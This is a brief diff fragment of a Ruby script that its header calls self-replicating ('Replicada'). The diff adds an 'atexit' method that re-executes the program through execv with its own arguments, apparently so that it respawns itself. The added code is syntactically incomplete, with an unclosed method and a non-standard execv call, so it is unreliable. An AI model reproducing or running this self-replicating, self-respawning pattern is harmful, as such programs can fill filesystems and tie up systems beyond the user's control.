@@ -10,6 +10,9 @@ self-replicating ruby file - Replicada by archisha69
 require "fileutils"
 require "securerandom"
 
+def atexit
+    execv(ARGV[0], *ARGV)   
+
 cwd = FileUtils.pwd()
 
 count = 0
